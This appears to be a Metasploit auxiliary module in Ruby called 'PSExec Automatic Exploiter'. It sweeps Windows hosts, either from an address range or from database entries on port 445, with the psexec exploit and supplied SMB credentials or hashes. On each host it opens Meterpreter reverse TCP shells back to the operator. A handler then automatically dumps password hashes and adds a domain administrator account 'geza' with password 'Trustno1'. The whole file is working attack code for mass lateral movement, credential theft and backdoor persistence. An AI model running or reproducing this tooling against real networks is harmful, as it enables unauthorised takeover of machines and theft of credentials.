# This module takes over Windows hosts using the psexec exploit using the data of the db.
# Runs Meterpreter by default using hashdump as the InitialAutoRunScript
# Uses the add_domainadmin Meterpreter script by default

require 'msf/core'

class Metasploit3 < Msf::Auxiliary


	def initialize(info = {})
                super(update_info(info,
                        'Name'        => 'PSExec Automatic Exploiter',
                        'Version'     => '1',
                        'Description' => %q{
                                        This module takes over Windows hosts using the psexec exploit using the data of the db.
					Runs Meterpreter by default using hashdump as the InitialAutoRunScript
					Uses the add_domainadmin Meterpreter script by default
                        },
                        'Author'      =>
                                [
                                        # initial concept by Z
                                        'vpb',
                                ],
                        'License'     => BSD_LICENSE,
                        'Actions'     =>
                                [
                                        [ 'Default Action', {
                                                'Description' => 'Default module action'
                                        } ],
                                ],
			'DefaultAction' => 'Default Action'
                        ))

                register_options([
			OptAddressRange.new('RHOSTS', [ false, "The target address range or CIDR identifier (Using the DB if omitted)"]),
                        OptAddress.new('LHOST', [true,
                                'The IP address to use for reverse-connect payloads'
                        ]),
			OptString.new('SMBUser',[true,'SMB User']),
			OptString.new('SMBPass',[true,'SMB Password hashes']),
			OptString.new('SMBDomain',[true,'SMB Domain','WORKGROUP']),
			OptString.new('AutoRunScript',[false,'AutoRunScript for Meterpreter','add_domainadmin -u geza -p Trustno1'])
                ], self.class)
	end	

	def run_psexec(h) 

		print_status("Trying #{h}")
		psexec=framework.modules.create('exploit/windows/smb/psexec')
		psexec.datastore['RHOST']=h
		psexec.datastore['SMBUser']=datastore['SMBUser']
		psexec.datastore['SMBPass']=datastore['SMBPass']
		psexec.datastore['SMBDomain']=datastore['SMBDomain']
		psexec.datastore['LHOST']=datastore['LHOST']
		psexec.datastore['PAYLOAD']='windows/meterpreter/reverse_tcp'
		psexec.datastore['DisablePayloadHandler'] = true
		
		psexec.exploit_simple(
               	        'LocalInput'     => self.user_input,
                       	'LocalOutput'    => self.user_output,
                       	'Target'         => 0,
                       	'Payload'        => 'windows/meterpreter/reverse_tcp',
                       	'RunAsJob'       => true
		)
	end

	def run_handler

		print_status("Starting the payload handler")
		multihandler=framework.modules.create('exploit/multi/handler')
		multihandler.datastore['LHOST']=(datastore['LHOST'] || "0.0.0.0")
		multihandler.datastore['InitialAutorunScript']='hashdump'
		multihandler.datastore['AutoRunScript']=datastore['AutoRunScript']
		multihandler.exploit_simple(
			'LocalInput'     => self.user_input,
                        'LocalOutput'    => self.user_output,
                        'Target'         => 0,
                        'Payload'        => 'windows/meterpreter/reverse_tcp',
                        'RunAsJob'       => true
		)
	end

	def run


		if (datastore['RHOSTS'].nil?) then
			begin
				services=framework.db.services(framework.db.default_workspace,false,nil,nil,445) 
				run_handler
				services.each do |s|
					run_psexec(s.host.address)
				end
			rescue ArgumentError
				print_error("No database or RHOSTS present!")
			end
		else
			run_handler
			rw=Rex::Socket::RangeWalker.new(datastore['RHOSTS'])
			while(ip=rw.next_ip) do
				run_psexec(ip)
			end

		end

	end

	def cleanup
		super
	end
end
